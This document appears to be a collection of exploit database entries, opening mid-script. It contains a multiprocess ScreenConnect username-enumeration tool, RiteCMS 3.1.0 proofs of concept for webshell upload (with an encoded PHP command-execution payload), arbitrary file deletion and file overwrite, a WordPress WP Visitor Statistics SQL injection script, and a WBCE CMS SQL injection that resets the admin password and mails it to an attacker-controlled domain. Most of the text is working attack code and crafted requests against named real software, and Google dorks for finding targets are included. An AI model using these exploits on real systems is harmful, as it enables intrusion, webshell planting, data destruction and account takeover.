            req = requests.request('POST',url,headers=headers,data=dataraw, proxies=proxies)

            x = "".join('{}: {}'.format(k, v) for k, v in req.headers.items())

            if re.search(r"{}".format(failstr), str(x).replace('\n','').replace('\r','')):
                queue.put((proc_id, "FOUND", user))
                found_queue.put((proc_id, "FOUND", user))
                if stop: break
            elif verbose:
                queue.put((proc_id, "TRIED", user))
            queue.put(("PERCENT", proc_id, (counter/total)*100))

    except (urlexcept.NewConnectionError, requests.exceptions.ConnectionError):
        print("[ATTENTION] Connection error on process {}! Try lowering the amount of threads with the -c parameter.".format(proc_id))


if __name__ == "__main__":
    # Arguments
    parser = argparse.ArgumentParser(description="http://example.com/Login user enumeration tool")
    parser.add_argument("url", help="http://example.com/Login")
    parser.add_argument("wordlist", help="username wordlist")
    parser.add_argument("-c", metavar="cnt", type=int, default=10, help="process (thread) count, default 10, too many processes may cause connection problems")
    parser.add_argument("-v", action="store_true", help="verbose mode")
    parser.add_argument("-s", action="store_true", help="stop on first user found")
    parser.add_argument("-p", metavar="proxy", type=str, help="socks4/5 http/https proxy, ex: socks5://127.0.0.1:9050")
    args = parser.parse_args()

    # Arguments to simple variables
    wordlist = args.wordlist
    url = args.url
    payload = ['ctl00%24Main%24userNameBox:{USER}', 'ctl00%24Main%24passwordBox:a', 'ctl00%24Main%24ctl05:Login', '__EVENTTARGET:', '__EVENTARGUMENT:', '__VIEWSTATE:']
    verbose = args.v
    thread_count = args.c
    failstr = "PasswordInvalid"
    stop = args.s
    proxy= args.p

    print(bcolors.HEADER + """
      __   ___  __     ___
|  | |__  |__  |__)   |__  |\ | |  | |\/|
|__| ___| |___ |  \   |___ | \| |__| |  |

ScreenConnect POC by czz78 :)

    """+ bcolors.ENDC);
    print("URL: "+url)
    print("Payload: "+str(payload))
    print("Fail string: "+failstr)
    print("Wordlist: "+wordlist)
    if verbose: print("Verbose mode")
    if stop: print("Will stop on first user found")

    proxies = {'http': '', 'https': ''}
    if proxy:
        proxies = {'http': proxy, 'https': proxy}

    print("Initializing processes...")
    # Distribute wordlist to processes
    wlfile = open(wordlist, "r", encoding="ISO-8859-1")  # or utf-8
    tothread = 0
    wllist = [[] for i in range(thread_count)]
    for user in wlfile:
        wllist[tothread-1].append(user.strip())
        if (tothread < thread_count-1):
            tothread+=1
        else:
            tothread = 0

    # Start processes
    tries_q = Queue()
    found_q = Queue()
    processes = []
    percentage = []
    last_percentage = 0
    for i in range(thread_count):
        p = Process(target=process_enum, args=(tries_q, found_q, wllist[i], url, payload, failstr, verbose, i, stop, proxy))
        processes.append(p)
        percentage.append(0)
        p.start()

    print(bcolors.OKBLUE + "Processes started successfully! Enumerating." + bcolors.ENDC)
    # Main process loop
    initial_count = len(processes)
    while True:
        # Read the process output queue
        try:
            oldest = tries_q.get(False)
            if oldest[0] == 'PERCENT':
                percentage[oldest[1]] = oldest[2]
            elif oldest[1] == 'FOUND':
                print(bcolors.OKGREEN + "[{}] FOUND: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
            elif verbose:
                print(bcolors.OKCYAN + "[{}] Tried: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
        except: pass

        # Calculate completion percentage and print if /10
        total_percentage = math.ceil(mean(percentage))
        if total_percentage % 10 == 0 and total_percentage != last_percentage:
            print("{}% complete".format(total_percentage))
            last_percentage = total_percentage

        # Pop dead processes
        for k, p in enumerate(processes):
            if p.is_alive() == False:
                processes.pop(k)

        # Terminate all processes if -s flag is present
        if len(processes) < initial_count and stop:
            for p in processes:
                p.terminate()

        # Print results and terminate self if finished
        if len(processes) == 0:
            print(bcolors.OKBLUE + "EnumUser finished, and these usernames were found:" + bcolors.ENDC)
            while True:
                try:
                    entry = found_q.get(False)
                    print(bcolors.OKGREEN + "[{}] FOUND: {}".format(entry[0], entry[2]) + bcolors.ENDC)
                except:
                    break
            quit()

 # Exploit Title: RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)
# Date: 25/07/2021
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://ritecms.com/
# Software Link: https://github.com/handylulu/RiteCMS/releases/download/V3.1.0/ritecms.v3.1.0.zip
# Version: <= 3.1.0
# Tested on: Windows 10, Ubuntu 18, XAMPP
# Google Dork: intext:"Powered by RiteCMS"
# Reference: https://gist.github.com/faisalfs10x/bd12e9abefb0d44f020bf297a14a4597


"""
################
# Description  #
################

# RiteCMS version 3.1.0 and below suffers from a remote code execution in admin panel. An authenticated attacker can upload a php file and bypass the .htacess configuration that deny execution of .php files in media and files directory by default.
# There are 4 ways of bypassing the current file upload protection to achieve remote code execution.

# Method 1: Delete the .htaccess file in the media and files directory through the files manager module and then upload the php file - RCE achieved

# Method 2: Rename .php file extension to .pHp or any except ".php", eg shell.pHp and upload the shell.pHp file - RCE achieved

# Method 3: Chain with Arbitrary File Overwrite vulnerability by uploading .php file to web root because .php execution is allow in web root - RCE achieved
By default, attacker can only upload image in media and files directory only - Arbitrary File Overwrite vulnerability.
Intercept the request, modify file_name param and place this payload "../webrootExec.php" to upload the php file to web root

body= Content-Disposition: form-data; name="file_name"
body= ../webrootExec.php

So, webshell can be accessed in web root via http://localhost/ritecms.v3.1.0/webrootExec.php

# Method 4: Upload new .htaccess to overwrite the old one with content like below for allowing access to one specific php file named "webshell.php" then upload PHP webshell.php - RCE achieved

$ cat .htaccess

<Files *.php>
deny from all
</Files>

<Files ~ "webshell\.php$">
  Allow from all
</Files>


###################################
# PoC for webshell using Method 2 #
###################################

Steps to Reproduce:

1. Login as admin
2. Go to Files Manager
3. Choose a directory to upload .php file either media or files directory.
4. Then, click Upload file > Browse..
3. Upload .php file with extension of pHp, eg webshell.pHp - to bypass .htaccess
4. The webshell.pHp is available at http://localhost/ritecms.v3.1.0/media/webshell.pHp - if you choose media directory else switch to files directory

Request:
========

POST /ritecms.v3.1.0/admin.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------410923806710384479662671954309
Content-Length: 1744
Origin: http://localhost
DNT: 1
Connection: close
Referer: http://localhost/ritecms.v3.1.0/admin.php?mode=filemanager&action=upload&directory=media
Cookie: PHPSESSID=vs8iq0oekpi8tip402mk548t84
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="mode"

filemanager
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="file"; filename="webshell.pHp"
Content-Type: application/octet-stream

<?php system($_GET[base64_decode('Y21k')]);?>
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="directory"

media
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="file_name"

-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="upload_mode"

1
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="resize_xy"

x
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="resize"

640
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="compression"

80
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="thumbnail_resize_xy"

x
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="thumbnail_resize"

150
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="thumbnail_compression"

70
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="upload_file_submit"

OK - Upload file
-----------------------------410923806710384479662671954309--


####################
# Webshell access: #
####################

# Webshell access via:
PoC: http://localhost/ritecms.v3.1.0/media/webshell.pHp?cmd=id

# Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

"""
 # Exploit Title: RiteCMS 3.1.0 - Arbitrary File Deletion (Authenticated)
# Date: 25/07/2021
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://ritecms.com/
# Software Link: https://github.com/handylulu/RiteCMS/releases/download/V3.1.0/ritecms.v3.1.0.zip
# Version: <= 3.1.0
# Google Dork: intext:"Powered by RiteCMS"
# Tested on: Windows 10, Ubuntu 18, XAMPP
# Reference: https://gist.github.com/faisalfs10x/5514b3eaf0a108e27f45657955e539fd


################
# Description  #
################

# RiteCMS version 3.1.0 and below suffers from an arbitrary file deletion vulnerability in Admin Panel. Exploiting the vulnerability allows an authenticated attacker to delete any file in the web root (along with any other file on the server that the PHP process user has the proper permissions to delete). Furthermore, an attacker might leverage the capability of arbitrary file deletion to circumvent certain webserver security mechanisms such as deleting .htaccess file that would deactivate those security constraints.


#####################################################
# PoC to delete secretConfig.conf file in web root  #
#####################################################


Steps to Reproduce:

1. Login as admin
2. Go to File Manager
3. Delete any file
4. Intercept the request and replace current file name to any files on the server via parameter "delete".

# Assumed there is a secretConfig.conf file in web root

PoC: param delete - Deleting secretConfig.conf file in web root, so the payload will be "../secretConfig.conf"

Request:
========

GET /ritecms.v3.1.0/admin.php?mode=filemanager&directory=media&delete=../secretConfig.conf&confirmed=true HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://localhost/ritecms.v3.1.0/admin.php?mode=filemanager
Cookie: PHPSESSID=vs8iq0oekpi8tip402mk548t84
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1
   # Exploit Title: RiteCMS 3.1.0 - Arbitrary File Overwrite (Authenticated)
# Date: 25/07/2021
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://ritecms.com/
# Software Link: https://github.com/handylulu/RiteCMS/releases/download/V3.1.0/ritecms.v3.1.0.zip
# Version: <= 3.1.0
# Google Dork: intext:"Powered by RiteCMS"
# Tested on: Windows 10, Ubuntu 18, XAMPP
# Reference: https://gist.github.com/faisalfs10x/4a3b76f666ff4c0443e104c3baefb91b


################
# Description  #
################

# RiteCMS version 3.1.0 and below suffers from an arbitrary file overwrite vulnerability in Admin Panel. Exploiting the vulnerability allows an authenticated attacker to overwrite any file in the web root (along with any other file on the server that the PHP process user has the proper permissions to write). Furthermore, an attacker might leverage the capability of arbitrary file overwrite to modify existing file such as /etc/passwd or /etc/shadow if the current PHP process user is run as root.


############################################################
# PoC to overwrite existing index.php to display phpinfo() #
############################################################


Steps to Reproduce:

1. Login as admin
2. Go to File Manager
3. Then, click Upload file > Browse..
4. Upload any file and click checkbox name "overwrite file with same name"
4. Intercept the request and replace current file name to any files path on the server via parameter "file_name".


PoC: param file_name - to overwrite index.php to display phpinfo, so the payload will be "../index.php"
     param filename - with the content of "<?php phpinfo(); ?>"

Request:
========

POST /ritecmsv3.1.0/admin.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------351719865731412638493510448298
Content-Length: 1840
Origin: http://localhost
DNT: 1
Connection: close
Referer: http://192.168.8.143/ritecmsv3.1.0/admin.php?mode=filemanager&action=upload&directory=media
Cookie: PHPSESSID=nuevl0lgkrc3dv44g3vgkoqqre
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="mode"

filemanager
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="file"; filename="anyfile.txt"
Content-Type: application/octet-stream

content of the file to overwrite here
-- this is example to overwrite index.php to display phpinfo --
<?php phpinfo(); ?>
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="directory"

media
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="file_name"

../index.php
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="overwrite_file"

true
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="upload_mode"

1
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="resize_xy"

x
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="resize"

640
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="compression"

80
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="thumbnail_resize_xy"

x
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="thumbnail_resize"

150
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="thumbnail_compression"

70
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="upload_file_submit"

OK - Upload file
-----------------------------351719865731412638493510448298--
  # Exploit Title: WordPress Plugin WP Visitor Statistics 4.7 - SQL Injection
# Date 22/12/2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.plugins-market.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-stats-manager.4.7.zip
# Version: <= 4.7
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24750
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24750/README.md

'''
Description:
The plugin does not properly sanitise and escape the refUrl in the refDetails AJAX action,
available to any authenticated user, which could allow users with a role as low as
subscriber to perform SQL injection attacks
'''

# Banner:
banner = '''
 ___  _  _  ____     ___   ___  ___   __     ___   __  ___  ___   ___ 
 / __)( \/ )( ___)___(__ \ / _ \(__ \ /  )___(__ \ /. |(__ )| __) / _ \
( (__  \  /  )__)(___)/ _/( (_) )/ _/  )((___)/ _/(_  _)/ / |__ \( (_) )
 \___)  \/  (____)   (____)\___/(____)(__)   (____) (_)(_/  (___/ \___/

                            [+] WP Visitor Statistics SQL Injection
                            [@] Developed by Ron Jost (Hacker5preme)

'''
print(banner)

import argparse
import requests
from datetime import datetime

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin WP Visitor Statistics - SQL Injection')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
my_parser.add_argument('-C', '--COMMAND', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
command = args.COMMAND

print('')
print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
print('')

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# Exploit:
exploit_url = 'http://' + target_ip + ':' + target_port + '/wordpress/wp-admin/admin-ajax.php?action=refDetails&requests={"refUrl":"' + "' " + command + '"}'
exploit = session.get(exploit_url)
print(exploit.text)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
# Exploit Title: WBCE CMS 1.5.1 - Admin Password Reset
# Google Dork: intext: "Way Better Content Editing"
# Date: 20/12/2021
# Exploit Author: citril or https://github.com/maxway2021
# Vendor Homepage: https://wbce.org/
# Software Link: https://wbce.org/de/downloads/
# Version: <= 1.5.1
# Tested on: Linux
# CVE : CVE-2021-3817
# Github repo: https://github.com/WBCE/WBCE_CMS
# Writeup: https://medium.com/@citril/cve-2021-3817-from-sqli-to-plaintext-admin-password-recovery-13735773cc75

import requests

_url = 'http://localhost/wbce/admin/login/forgot/index.php' # from mylocalhost environment
_domain = 'pylibs.org' # you have to catch all emails! I used Namecheap domain controller's 'catch all emails and redirect to specific email address' feature

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
}

_p = "email=%27/**/or/**/user_id=1/**/or/**/'admin%40" + _domain + "&submit=justrandomvalue"

r = requests.post(url = _url, headers = headers, data = _p)
if r.status_code == 200:
    print('[+] Check your email, you are probably going to receive plaintext password which belongs to administrator.')
 
